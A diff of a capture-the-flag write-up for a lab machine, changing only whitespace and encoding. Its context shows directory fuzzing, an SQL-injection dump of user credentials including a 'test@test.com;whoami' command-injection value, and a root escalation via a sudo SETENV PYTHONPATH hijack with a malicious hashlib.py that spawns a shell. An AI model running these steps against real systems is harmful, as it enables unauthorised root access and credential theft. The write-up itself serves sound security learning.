@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 8000 | http    |
+| 22 | ssh |
+| 8000 | http |
 
 
 
@@ -27,29 +27,29 @@ As we can see, we got a login page, let's try to fuzz before trying any vuln suc
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.160.42:8000/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.160.42:8000/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.160.42:8000/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-login                   [Status: 200, Size: 856, Words: 43, Lines: 26, Duration: 338ms]
-register                [Status: 200, Size: 964, Words: 51, Lines: 27, Duration: 886ms]
-logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 190ms]
+login [Status: 200, Size: 856, Words: 43, Lines: 26, Duration: 338ms]
+register [Status: 200, Size: 964, Words: 51, Lines: 27, Duration: 886ms]
+logout [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 190ms]
 ```
 
 Seems like nothing important can be found, let's proceed to the login page then.
@@ -100,10 +100,10 @@ Database: website
 Table: users
 [2 entries]
 +----+----------------------+----------------+----------+
-| id | email                | password       | username |
+| id | email | password | username |
 +----+----------------------+----------------+----------+
-| 1  | smokey@email.boop    | My_P@ssW0rd123 | smokey   |
-| 2  | test@test.com;whoami | test           | test     |
+| 1 | smokey@email.boop | My_P@ssW0rd123 | smokey |
+| 2 | test@test.com;whoami | test | test |
 +----+----------------------+----------------+----------+
 ```
 
@@ -134,16 +134,16 @@ This task runs as `smokey` so we cannot get a root shell with that, if we check 
 ```
 smokey@ip-10-10-160-42:~$ ls -la /home/hazel/
 total 32
-drwxr-xr-x 3 root  root  4096 Mar  2  2022 .
-drwxr-xr-x 5 root  root  4096 May 15 17:18 ..
-lrwxrwxrwx 1 root  root     9 Dec  7  2021 .bash_history -> /dev/null
--rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
-drwx------ 2 hazel hazel 4096 Dec  7  2021 .cache
--rw-r----- 1 root  hazel  497 Dec  7  2021 hasher.py
--rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
--rw-r----- 1 root  hazel   45 Mar  2  2022 user.txt
--rw------- 1 hazel hazel    0 Dec  7  2021 .viminfo
+drwxr-xr-x 3 root root 4096 Mar 2 2022 .
+drwxr-xr-x 5 root root 4096 May 15 17:18 ..
+lrwxrwxrwx 1 root root 9 Dec 7 2021 .bash_history -> /dev/null
+-rw-r--r-- 1 hazel hazel 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 hazel hazel 3771 Feb 25 2020 .bashrc
+drwx------ 2 hazel hazel 4096 Dec 7 2021 .cache
+-rw-r----- 1 root hazel 497 Dec 7 2021 hasher.py
+-rw-r--r-- 1 hazel hazel 807 Feb 25 2020 .profile
+-rw-r----- 1 root hazel 45 Mar 2 2022 user.txt
+-rw------- 1 hazel hazel 0 Dec 7 2021 .viminfo
 ```
 
 There's a file named `hasher.py`, seems like that could be our way into root, since we need `hazel` credentials and there seems to be no backup or anything that reveals us this user's password, let's try brute force:
@@ -176,15 +176,15 @@ If we check our sudo privileges, we can notice this:
 ```bash
 hazel@ip-10-10-160-42:~$ sudo -l
 Matching Defaults entries for hazel on ip-10-10-160-42:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass,
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User hazel may run the following commands on ip-10-10-160-42:
-    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
+ (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
 
 
 hazel@ip-10-10-160-42:~$ ls -l hasher.py
--rw-r----- 1 root hazel 497 Dec  7  2021 hasher.py
+-rw-r----- 1 root hazel 497 Dec 7 2021 hasher.py
 ```
 
 Let's check the code for the script:
@@ -194,46 +194,46 @@ import hashlib
 
 def hashing(passw):
 
-    md5 = hashlib.md5(passw.encode())
+ md5 = hashlib.md5(passw.encode())
 
-    print("Your MD5 hash is: ", end ="")
-    print(md5.hexdigest())
+ print("Your MD5 hash is: ", end ="")
+ print(md5.hexdigest())
 
-    sha256 = hashlib.sha256(passw.encode())
+ sha256 = hashlib.sha256(passw.encode())
 
-    print("Your SHA256 hash is: ", end ="")
-    print(sha256.hexdigest())
+ print("Your SHA256 hash is: ", end ="")
+ print(sha256.hexdigest())
 
-    sha1 = hashlib.sha1(passw.encode())
+ sha1 = hashlib.sha1(passw.encode())
 
-    print("Your SHA1 hash is: ", end ="")
-    print(sha1.hexdigest())
+ print("Your SHA1 hash is: ", end ="")
+ print(sha1.hexdigest())
 
 
 def main():
-    passw = input("Enter a password to hash: ")
-    hashing(passw)
+ passw = input("Enter a password to hash: ")
+ hashing(passw)
 
 if __name__ == "__main__":
-    main()
+ main()
 ```
 
-We cannot write on the file so we need to exploit it using the `SETENV` tag, this tag allows us to set environment variables on the sudo command line, if we are able to hijack the `PYTHONPATH` we will get a shell as root, TheÂ `PYTHONPATH`environment variableÂ controls where Python looks for modules. When Python imports a module likeÂ `hashlib`, it searches for the module in the following order:
+We cannot write on the file so we need to exploit it using the `SETENV` tag, this tag allows us to set environment variables on the sudo command line, if we are able to hijack the `PYTHONPATH` we will get a shell as root, The`PYTHONPATH`environment variable controls where Python looks for modules. When Python imports a module like`hashlib`, it searches for the module in the following order:
 
 - Current directory
-- Directories in theÂ `PYTHONPATH`Â environment variable
+- Directories in the`PYTHONPATH` environment variable
 - Standard library directories
 - Site-packages directories
 
 Understanding the flow, we can follow these steps to get a root as shell:
 
-1. **Create a maliciousÂ `hashlib.py`Â module**Â that spawns a shell when imported:
+1. **Create a malicious`hashlib.py` module** that spawns a shell when imported:
 
 ```bash
 echo 'import os; os.system("/bin/bash")' > /tmp/hashlib.py
 ```
 
-2. **Execute theÂ `hasher.py`Â script with sudo**, hijacking theÂ `PYTHONPATH`Â environment variable to includeÂ `/tmp`. 
+2. **Execute the`hasher.py` script with sudo**, hijacking the`PYTHONPATH` environment variable to include`/tmp`. 
 
 ```python
 sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
